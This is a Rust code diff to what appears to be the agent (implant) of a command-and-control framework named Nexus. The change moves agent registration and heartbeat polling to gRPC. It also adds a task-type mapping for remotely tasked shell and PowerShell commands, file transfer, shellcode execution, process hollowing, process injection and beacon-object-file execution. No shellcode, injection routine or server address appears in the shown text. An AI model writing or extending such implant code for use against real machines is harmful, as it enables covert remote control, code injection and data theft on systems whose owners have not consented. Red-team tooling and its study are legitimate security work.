@@ -2,9 +2,8 @@ use nexus_common::*;
 use crate::communication::NetworkClient;
 use crate::execution::TaskExecutor;
 use crate::system::SystemInfo;
-use std::sync::Arc;
 use std::time::Duration;
-use tokio::time::{sleep, timeout};
+use tokio::time::timeout;
 
 pub struct NexusAgent {
     id: Option<String>,
@@ -96,26 +95,18 @@ impl NexusAgent {
             capabilities: self.capabilities.clone(),
         };
 
-        let message = Message::registration(serde_json::to_string(&registration_data)?);
-        let encrypted_message = self.crypto.encrypt(&serde_json::to_string(&message)?)?;
-
-        // Send registration with timeout
-        let response = timeout(
+        // Send registration via gRPC
+        let agent_id = timeout(
             Duration::from_secs(30),
-            self.network_client.send_message(&encrypted_message)
+            self.network_client.register_agent(&registration_data)
         ).await??;
 
-        let decrypted_response = self.crypto.decrypt(&response)?;
-        let response_message: Message = serde_json::from_str(&decrypted_response)?;
-
-        if response_message.msg_type == MessageType::Registration {
-            self.id = Some(response_message.content);
-            self.registered = true;
-            self.last_heartbeat = current_timestamp();
-            
-            #[cfg(debug_assertions)]
-            println!("Successfully registered with agent ID: {}", self.id.as_ref().unwrap());
-        }
+        self.id = Some(agent_id);
+        self.registered = true;
+        self.last_heartbeat = current_timestamp();
+        
+        #[cfg(debug_assertions)]
+        println!("Successfully registered with agent ID: {}", self.id.as_ref().unwrap());
 
         Ok(())
     }
@@ -124,32 +115,53 @@ impl NexusAgent {
         let agent_id = self.id.as_ref()
             .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;
 
-        let message = Message::heartbeat(agent_id.clone());
-        let encrypted_message = self.crypto.encrypt(&serde_json::to_string(&message)?)?;
-
-        // Send heartbeat with timeout
-        let response = timeout(
+        // Send heartbeat and get tasks via gRPC
+        let grpc_tasks = timeout(
             Duration::from_secs(15),
-            self.network_client.send_message(&encrypted_message)
+            self.network_client.heartbeat(agent_id)
         ).await??;
-
-        let decrypted_response = self.crypto.decrypt(&response)?;
-        let response_message: Message = serde_json::from_str(&decrypted_response)?;
 
         self.last_heartbeat = current_timestamp();
 
-        // Check if we received task assignments
+        // Convert gRPC tasks to internal TaskData format
         let mut tasks = Vec::new();
-        match response_message.msg_type {
-            MessageType::TaskAssignment => {
-                if let Ok(task_data) = serde_json::from_str::<TaskData>(&response_message.content) {
-                    tasks.push(task_data);
-                }
+        for grpc_task in grpc_tasks {
+            if let Ok(task_data) = self.convert_grpc_task_to_task_data(grpc_task) {
+                tasks.push(task_data);
             }
-            _ => {}
         }
 
         Ok(tasks)
+    }
+
+    /// Convert gRPC Task to internal TaskData format
+    fn convert_grpc_task_to_task_data(&self, grpc_task: crate::communication::nexus::v1::Task) -> Result<TaskData> {
+        use crate::communication::nexus::v1::TaskType;
+        
+        let task_type = match TaskType::try_from(grpc_task.task_type) {
+            Ok(TaskType::ShellCommand) => "shell_command",
+            Ok(TaskType::PowershellCommand) => "powershell_command", 
+            Ok(TaskType::FileUpload) => "file_upload",
+            Ok(TaskType::FileDownload) => "file_download",
+            Ok(TaskType::DirectoryListing) => "directory_listing",
+            Ok(TaskType::ProcessList) => "process_list",
+            Ok(TaskType::SystemInfo) => "system_info",
+            Ok(TaskType::NetworkInfo) => "network_info",
+            Ok(TaskType::FiberShellcode) => "fiber_shellcode",
+            Ok(TaskType::FiberHollowing) => "fiber_hollowing",
+            Ok(TaskType::ProcessInjection) => "process_injection",
+            Ok(TaskType::BofExecution) => "bof_execution",
+            _ => "unknown",
+        }.to_string();
+
+        Ok(TaskData {
+            task_id: grpc_task.task_id,
+            task_type,
+            command: grpc_task.command,
+            parameters: grpc_task.parameters,
+            timeout: Some(grpc_task.timeout_seconds as u64),
+            priority: grpc_task.priority as u8,
+        })
     }
 
     async fn execute_task(&mut self, task_data: TaskData) -> Result<()> {
@@ -171,7 +183,7 @@ impl NexusAgent {
                 TaskResult::success(task_id.clone(), output, (current_timestamp() - start_time) * 1000)
             }
             Ok(Err(e)) => {
-                TaskResult::error(task_id.clone(), e.to_string(), (current_timestamp() - start_time) * 1000)
+                TaskResult::failure(task_id.clone(), e.to_string(), (current_timestamp() - start_time) * 1000)
             }
             Err(_) => {
                 TaskResult::timeout(task_id.clone(), (current_timestamp() - start_time) * 1000)
